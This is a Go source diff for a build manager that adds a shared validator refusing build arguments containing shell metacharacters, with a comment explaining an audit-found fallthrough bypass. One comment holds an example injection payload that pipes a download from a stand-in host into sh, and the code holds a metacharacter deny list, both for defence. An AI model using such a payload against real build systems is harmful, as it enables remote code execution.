@@ -112,8 +112,44 @@ func defaultGradleOpts() string {
 	return `-Xmx6g -XX:MaxMetaspaceSize=1g -Dorg.gradle.jvmargs=-Xmx6g -XX:MaxMetaspaceSize=1g`
 }
 
+// buildArgShellMeta are the characters that let a build arg break out of the
+// command string every resolver here composes. The resolved command is run via
+// `sh -c` (ExecManager.StartExec), and extraArgs is spliced into it verbatim,
+// so `{"args":["x; curl evil|sh"]}` would execute. Legit build args are plain
+// identifiers and flags: assembleRelease, --flavor=prod, -PsomeProp=1.
+const buildArgShellMeta = ";&|<>$`\n\r(){}!*?\\\"'"
+
+// validateBuildArgs rejects any build arg that could escape `sh -c`.
+//
+// SECURITY (audit 2026-07-28): this check used to live ONLY in
+// resolveNativeBuildCommand, which covered the two native platforms and left
+// every other platform in resolveBuildCommand's switch splicing args in raw.
+// Worse, the native check signalled refusal by returning ok=false — the same
+// value that means "not a native platform" — so a rejected arg did not stop the
+// build, it FELL THROUGH into the unsanitized general switch. A guard that
+// downgrades into the path it was guarding against is not a guard.
+//
+// It lives here now, is called once at the top of resolveBuildCommand so it
+// cannot be bypassed by fallthrough, and is the single definition both
+// resolvers share so the two charsets cannot drift apart.
+func validateBuildArgs(extraArgs []string) error {
+	for _, a := range extraArgs {
+		if strings.ContainsAny(a, buildArgShellMeta) {
+			return fmt.Errorf("build arg contains shell metacharacters and was refused: %q", a)
+		}
+	}
+	return nil
+}
+
 // resolveBuildCommand returns the shell command and expected artifact patterns for a platform.
 func resolveBuildCommand(platform BuildPlatform, workDir string, extraArgs []string) (command string, artifactPatterns []string) {
+	// Refuse unsafe args for EVERY platform before any resolver runs. Callers
+	// see an empty command; StartBuild turns that into an error. Checked again
+	// in StartBuild so the caller gets the specific offending arg.
+	if validateBuildArgs(extraArgs) != nil {
+		return "", nil
+	}
+
 	// Native build platforms (gradle-device-install, flutter-device-install)
 	// live in native_build.go; check there first so they don't need to be
 	// duplicated in the big switch below.
@@ -376,6 +412,12 @@ func resolveBuildCommand(platform BuildPlatform, workDir string, extraArgs []str
 func (bm *BuildManager) StartBuild(platform BuildPlatform, workDir string, extraArgs []string, installOnDevice ...bool) (*Build, error) {
 	if workDir == "" {
 		workDir = bm.workDir
+	}
+
+	// Checked before resolveBuildCommand so a refused arg reports the arg
+	// itself rather than the misleading "unknown build platform".
+	if err := validateBuildArgs(extraArgs); err != nil {
+		return nil, err
 	}
 
 	command, artifactPatterns := resolveBuildCommand(platform, workDir, extraArgs)
